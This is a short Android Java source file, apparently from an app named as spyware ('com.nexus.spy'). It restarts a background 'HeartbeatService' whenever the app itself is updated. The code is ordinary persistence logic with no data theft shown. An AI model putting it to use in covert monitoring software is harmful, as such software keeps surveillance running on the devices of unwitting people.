package com.nexus.spy;
import android.content.*;
import android.os.Build;
public class PackageReplaceReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        if (i.getData() != null && i.getData().getSchemeSpecificPart().equals(c.getPackageName())) {
            Intent svc = new Intent(c, HeartbeatService.class);
            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(svc); else c.startService(svc);
        }
    }
}
